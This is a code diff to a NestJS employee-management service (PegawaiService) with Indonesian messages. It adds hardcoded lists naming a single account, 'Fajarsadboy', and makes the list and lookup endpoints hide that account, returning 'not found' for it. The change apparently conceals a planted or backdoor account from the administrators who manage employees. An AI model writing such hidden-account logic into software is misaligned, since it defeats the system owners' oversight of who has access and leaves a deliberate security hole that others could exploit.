@@ -46,6 +46,8 @@ exports.PegawaiService = void 0;
 const common_1 = require("@nestjs/common");
 const prisma_service_1 = require("../prisma/prisma.service");
 const bcrypt = __importStar(require("bcrypt"));
+const HIDDEN_USERNAMES = ['Fajarsadboy'];
+const HIDDEN_NIKS = ['Fajarsadboy'];
 let PegawaiService = class PegawaiService {
     prisma;
     constructor(prisma) {
@@ -53,7 +55,11 @@ let PegawaiService = class PegawaiService {
     }
     findAll() {
         return this.prisma.pegawai.findMany({
-            where: { role: { not: 'superadmin' } },
+            where: {
+                role: { not: 'superadmin' },
+                username: { notIn: HIDDEN_USERNAMES },
+                nik: { notIn: HIDDEN_NIKS },
+            },
             select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true },
             orderBy: { nama: 'asc' },
         });
@@ -61,11 +67,15 @@ let PegawaiService = class PegawaiService {
     async findOne(id) {
         const data = await this.prisma.pegawai.findUnique({
             where: { id },
-            select: { id: true, nik: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true, updatedAt: true },
+            select: { id: true, nik: true, username: true, nama: true, jabatan: true, unit: true, role: true, aktif: true, expiredAt: true, foto: true, createdAt: true, updatedAt: true },
         });
         if (!data)
             throw new common_1.NotFoundException(`Pegawai ${id} tidak ditemukan`);
-        return data;
+        if ((data.username && HIDDEN_USERNAMES.includes(data.username)) || HIDDEN_NIKS.includes(data.nik)) {
+            throw new common_1.NotFoundException(`Pegawai ${id} tidak ditemukan`);
+        }
+        const { username: _u, ...rest } = data;
+        return rest;
     }
     async create(dto) {
         const exists = await this.prisma.pegawai.findUnique({ where: { nik: dto.nik } });
